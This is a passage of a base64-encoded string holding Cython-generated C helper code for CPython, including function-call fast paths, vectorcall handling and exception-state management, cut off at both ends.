CAgICAgICAgICAgICAgICAgICAgIGssIChpbnQpbmssXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCwgKGludCluZCwga3dkZWZzLCBjbG9zdXJlKTtcbiAgICBQeV9YREVDUkVGKGt3dHVwbGUpO1xuZG9uZTpcbiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRoTyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZykge1xuICAgIFB5T2JqZWN0ICpzZWxmLCAqcmVzdWx0O1xuICAgIFB5Q0Z1bmN0aW9uIGNmdW5jO1xuICAgIGNmdW5jID0gX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKTtcbiAgICBzZWxmID0gX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9TRUxGKGZ1bmMpO1xuICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gY2Z1bmMoc2VsZiwgYXJnKTtcbiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkgJiYgdW5saWtlbHkoIVB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhcbiAgICAgICAgICAgIFB5RXhjX1N5c3RlbUVycm9yLFxuICAgICAgICAgICAgIk5VTEwgcmVzdWx0IHdpdGhvdXQgZXJyb3IgaW4gUHlPYmplY3RfQ2FsbCIpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsX2ZhbGxiYWNrKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncykge1xuICAgIFB5T2JqZWN0ICphcmdzdHVwbGU7XG4gICAgUHlPYmplY3QgKnJlc3VsdCA9IDA7XG4gICAgc2l6ZV90IGk7XG4gICAgYXJnc3R1cGxlID0gUHlUdXBsZV9OZXcoKFB5X3NzaXplX3QpbmFyZ3MpO1xuICAgIGlmICh1bmxpa2VseSghYXJnc3R1cGxlKSkgcmV0dXJuIE5VTEw7XG4gICAgZm9yIChpID0gMDsgaSA8IG5hcmdzOyBpKyspIHtcbiAgICAgICAgUHlfSU5DUkVGKGFyZ3NbaV0pO1xuICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShhcmdzdHVwbGUsIChQeV9zc2l6ZV90KWksIGFyZ3NbaV0pICE9ICgwKSkgZ290byBiYWQ7XG4gICAgfVxuICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoZnVuYywgYXJnc3R1cGxlLCBrd2FyZ3MpO1xuICBiYWQ6XG4gICAgUHlfREVDUkVGKGFyZ3N0dXBsZSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgX1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSlcbiAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2ZWN0b3JjYWxsZnVuYyBfX1B5eF9QeVZlY3RvcmNhbGxfRnVuY3Rpb24oUHlPYmplY3QgKmNhbGxhYmxlKSB7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUoY2FsbGFibGUpO1xuICAgICNpZiBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRClcbiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KGNhbGxhYmxlKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY2FsbGFibGUpO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBpZiAoIVB5VHlwZV9IYXNGZWF0dXJlKHRwLCBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCkpIHtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGFzc2VydChQeUNhbGxhYmxlX0NoZWNrKGNhbGxhYmxlKSk7XG4gICAgUHlfc3NpemVfdCBvZmZzZXQgPSB0cC0+dHBfdmVjdG9yY2FsbF9vZmZzZXQ7XG4gICAgYXNzZXJ0KG9mZnNldCA+IDApO1xuICAgIHZlY3RvcmNhbGxmdW5jIHB0cjtcbiAgICBtZW1jcHkoJnB0ciwgKGNoYXIgKikgY2FsbGFibGUgKyBvZmZzZXQsIHNpemVvZihwdHIpKTtcbiAgICByZXR1cm4gcHRyO1xufVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKSBQeVZlY3RvcmNhbGxfRnVuY3Rpb24oY2FsbGFibGUpXG4gICNlbmRpZlxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBfbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHtcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKF9uYXJncyk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgaWYgKG5hcmdzID09IDAgJiYga3dhcmdzID09IE5VTEwpIHtcbiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX05PQVJHUykpXG4gICAgICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKGZ1bmMsIE5VTEwpO1xuICAgIH1cbiAgICBlbHNlIGlmIChuYXJncyA9PSAxICYmIGt3YXJncyA9PSBOVUxMKSB7XG4gICAgICAgIGlmIChfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgbGlrZWx5KCBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICYgTUVUSF9PKSlcbiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oZnVuYywgYXJnc1swXSk7XG4gICAgfVxuI2VuZGlmXG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBCMVxuICAgICNpZiBDWVRIT05fRkFTVF9QWUNDQUxMXG4gICAgaWYgKFB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIGlmIChrd2FyZ3MpIHtcbiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIG5hcmdzLCBrd2FyZ3MpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuIF9QeUNGdW5jdGlvbl9GYXN0Q2FsbEtleXdvcmRzKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBpZiAoIWt3YXJncyAmJiBfX1B5eF9JU19UWVBFKGZ1bmMsICZQeU1ldGhvZERlc2NyX1R5cGUpKSB7XG4gICAgICAgIHJldHVybiBfUHlNZXRob2REZXNjcl9GYXN0Q2FsbEtleXdvcmRzKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgI2lmIENZVEhPTl9GQVNUX1BZQ0FMTFxuICAgIGlmIChQeUZ1bmN0aW9uX0NoZWNrKGZ1bmMpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCBuYXJncywga3dhcmdzKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgI2VuZGlmXG4gICAgaWYgKGt3YXJncyA9PSBOVUxMKSB7XG4gICAgICAgICNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICB2ZWN0b3JjYWxsZnVuYyBmID0gX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGZ1bmMpO1xuICAgICAgICBpZiAoZikge1xuICAgICAgICAgICAgcmV0dXJuIGYoZnVuYywgYXJncywgX25hcmdzLCBOVUxMKTtcbiAgICAgICAgfVxuICAgICAgICAjZWxpZiBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgJiYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTExcbiAgICAgICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChmdW5jKSkge1xuICAgICAgICAgICAgX19weXhfdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGZ1bmMpO1xuICAgICAgICAgICAgaWYgKGYpIHJldHVybiBmKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7XG4gICAgICAgIH1cbiAgICAgICAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fVkVDVE9SQ0FMTFxuICAgICAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbChmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4gICAgaWYgKG5hcmdzID09IDApIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0NhbGwoZnVuYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIGt3YXJncyk7XG4gICAgfVxuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgcmV0dXJuIFB5T2JqZWN0X1ZlY3RvcmNhbGxEaWN0KGZ1bmMsIGFyZ3MsIChzaXplX3QpbmFyZ3MsIGt3YXJncyk7XG4gICAgI2Vsc2VcbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGxfZmFsbGJhY2soZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTtcbiAgICAjZW5kaWZcbn1cblxuXG4jaWYgIUNZVEhPTl9WRUNUT1JDQUxMIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBQeU9iamVjdCAqYXR0ciA9IFB5T2JqZWN0X0dldEF0dHIoYXJnc1swXSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFhdHRyKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoYXR0ciwgYXJncysxLCBuYXJnc2YgLSAxKTtcbiAgICBQeV9ERUNSRUYoYXR0cik7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSkge1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19VbmJvdW5kTG9jYWxFcnJvciwgImxvY2FsIHZhcmlhYmxlIFwnJXNcJyByZWZlcmVuY2VkIGJlZm9yZSBhc3NpZ25tZW50IiwgdmFybmFtZSk7XG59XG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIGludCBfX1B5eF9fR2V0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKVxuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfR2V0RXhjZXB0aW9uKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YilcbiNlbmRpZlxue1xuICAgIFB5T2JqZWN0ICpsb2NhbF90eXBlID0gTlVMTCwgKmxvY2FsX3ZhbHVlLCAqbG9jYWxfdGIgPSBOVUxMO1xuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICBsb2NhbF92YWx1ZSA9IHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb247XG4gICAgdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA9IDA7XG4gICNlbHNlXG4gICAgbG9jYWxfdHlwZSA9IHRzdGF0ZS0+Y3VyZXhjX3R5cGU7XG4gICAgbG9jYWxfdmFsdWUgPSB0c3RhdGUtPmN1cmV4Y192YWx1ZTtcbiAgICBsb2NhbF90YiA9IHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmN1cmV4Y190eXBlID0gMDtcbiAgICB0c3RhdGUtPmN1cmV4Y192YWx1ZSA9IDA7XG4gICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gMDtcbiAgI2VuZGlmXG4jZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMFxuICAgIGxvY2FsX3ZhbHVlID0gUHlFcnJfR2V0UmFpc2VkRXhjZXB0aW9uKCk7XG4jZWxzZVxuICAgIFB5RXJyX0ZldGNoKCZsb2NhbF90eXBlLCAmbG9jYWxfdmFsdWUsICZsb2NhbF90Yik7XG4jZW5kaWZcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMFxuICAgIGlmIChsaWtlbHkobG9jYWxfdmFsdWUpKSB7XG4gICAgICAgIGxvY2FsX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGxvY2FsX3ZhbHVlKTtcbiAgICAgICAgUHlfSU5DUkVGKGxvY2FsX3R5cGUpO1xuICAgICAgICBsb2NhbF90YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhsb2NhbF92YWx1ZSk7XG4gICAgfVxuI2Vsc2VcbiAgICBQeUVycl9Ob3JtYWxpemVFeGNlcHRpb24oJmxvY2FsX3R5cGUsICZsb2NhbF92YWx1ZSwgJmxvY2FsX3RiKTtcbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBpZiAodW5saWtlbHkodHN0YXRlLT5jdXJleGNfdHlwZSkpXG4jZWxzZVxuICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSlcbiNlbmRpZlxuICAgICAgICBnb3RvIGJhZDtcbiAgICBpZiAobG9jYWxfdGIpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5RXhjZXB0aW9uX1NldFRyYWNlYmFjayhsb2NhbF92YWx1ZSwgbG9jYWxfdGIpIDwgMCkpXG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICB9XG4jZW5kaWYgLy8gX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDBcbiAgICBQeV9YSU5DUkVGKGxvY2FsX3RiKTtcbiAgICBQeV9YSU5DUkVGKGxvY2FsX3R5cGUpO1xuICAgIFB5X1hJTkNSRUYobG9jYWxfdmFsdWUpO1xuICAgICp0eXBlID0gbG9jYWxfdHlwZTtcbiAgICAqdmFsdWUgPSBsb2NhbF92YWx1ZTtcbiAgICAqdGIgPSBsb2NhbF90YjtcbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIHtcbiAgICAgICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTRcbiAgICAgICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICAgICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlO1xuICAgICAgICB0bXBfdHlwZSA9IE5VTEw7XG4gICAgICAgIHRtcF90YiA9IE5VTEw7XG4gICAgICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7XG4gICAgICAgIFB5X1hERUNSRUYobG9jYWxfdGIpO1xuICAgICAgI2Vsc2VcbiAgICAgICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7XG4gICAgICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgICAgIHRtcF90YiA9IGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrO1xuICAgICAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSBsb2NhbF90eXBlO1xuICAgICAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7XG4gICAgICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gbG9jYWxfdGI7XG4gICAgICAjZW5kaWZcbiAgICB9XG4gICAgI2Vsc2VcbiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7XG4gICAgdG1wX3RiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrO1xuICAgIHRzdGF0ZS0+ZXhjX3R5cGUgPSBsb2NhbF90eXBlO1xuICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7XG4gICAgdHN0YXRlLT5leGNfdHJhY2ViYWNrID0gbG9jYWxfdGI7XG4gICAgI2VuZGlmXG4gICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYodG1wX3RiKTtcbiNlbGlmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMFxuICAgIFB5RXJyX1NldEhhbmRsZWRFeGNlcHRpb24obG9jYWxfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF90Yik7XG4jZWxzZVxuICAgIFB5RXJyX1NldEV4Y0luZm8obG9jYWxfdHlwZSwgbG9jYWxfdmFsdWUsIGxvY2FsX3RiKTtcbiNlbmRpZlxuICAgIHJldHVybiAwO1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPD0gMHgwMzBDMDAwMFxuYmFkOlxuICAgICp0eXBlID0gMDtcbiAgICAqdmFsdWUgPSAwO1xuICAgICp0YiA9IDA7XG4gICAgUHlfWERFQ1JFRihsb2NhbF90eXBlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTtcbiAgICByZXR1cm4gLTE7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pIHtcbiAgICBQeU9iamVjdCAqZXhjLCAqdmFsLCAqdGIsICpjdXJfZXhjLCAqbmV3X2V4YztcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBpbnQgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA9IDA7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW5fYXN5bmNfZ2VuKTtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIGN1cl9leGMgPSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpO1xuICAgIGlmIChsaWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgaWYgKGluX2FzeW5jX2dlbiAmJiB1bmxpa2VseShfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoY3VyX2V4YywgUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgICAgIGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPSAxO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG4gICAgfVxuICAgIF9fUHl4X0dldEV4Y2VwdGlvbigmZXhjLCAmdmFsLCAmdGIpO1xuICAgIFB5X1hERUNSRUYoZXhjKTtcbiAgICBQeV9YREVDUkVGKHRiKTtcbiAgICBuZXdfZXhjID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKFB5RXhjX1J1bnRpbWVFcnJvciwgInMiLFxuICAgICAgICBpc19hc3luY19zdG9waXRlcmF0aW9uID8gImFzeW5jIGdlbmVyYXRvciByYWlzZWQgU3RvcEFzeW5jSXRlcmF0aW9uIiA6XG4gICAgICAgIGluX2FzeW5jX2dlbiA/ICJhc3luYyBnZW5lcmF0b3IgcmFpc2VkIFN0b3BJdGVyYXRpb24iIDpcbiAgICAgICAgImdlbmVyYXRvciByYWlzZWQgU3RvcEl0ZXJhdGlvbiIpO1xuICAgIGlmICghbmV3X2V4Yykge1xuICAgICAgICBQeV9YREVDUkVGKHZhbCk7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgUHlFeGNlcHRpb25fU2V0Q2F1c2UobmV3X2V4YywgdmFsKTsgLy8gc3RlYWxzIHJlZiB0byB2YWxcbiAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfUnVudGltZUVycm9yLCBuZXdfZXhjKTtcbn1cblxuXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHtcbiAgICAodm9pZClfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3Q7XG4gICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYnVpbGRlciwgbiwga2V5KSAhPSAoMCkpIHJldHVybiAtMTtcbiAgICBQeV9JTkNSRUYoa2V5KTtcbiAgICBhcmdzW25dID0gdmFsdWU7XG4gICAgcmV0dXJuIDA7XG59XG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHtcbiAgICAodm9pZClfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHI7XG4gICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoa2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7XG59XG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHtcbiAgICBQeU9iamVjdCAqcHlLZXkgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhrZXkpO1xuICAgIGlmICghcHlLZXkpIHJldHVybiAtMTtcbiAgICByZXR1cm4gX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKHB5S2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7XG59XG4jZWxzZSAvLyBDWVRIT05fVkVDVE9SQ0FMTFxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ19DaGVjayhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICoqYXJncywgQ1lUSE9OX1VOVVNFRCBpbnQgbikge1xuICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gUHlEaWN0X1NldEl0ZW0oYnVpbGRlciwga2V5LCB2YWx1ZSk7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaikge1xuICAgIGlmICh1bmxpa2VseShvYmogPT0gUHlfTm9uZSkpXG4gICAgICAgIG9iaiA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTm9uZTtcbiAgICByZXR1cm4gX19QeXhfTmV3UmVmKG9iaik7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKSB7XG4gICAgUHlPYmplY3QgKnI7XG4gICAgaWYgKHVubGlrZWx5KCFqKSkgcmV0dXJuIE5VTEw7XG4gICAgciA9IFB5T2JqZWN0X0dldEl0ZW0obywgaik7XG4gICAgUHlfREVDUkVGKGopO1xuICAgIHJldHVybiByO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfTGlzdF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgYm91bmRzY2hlY2spIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAmJiAhQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTtcbiAgICBpZ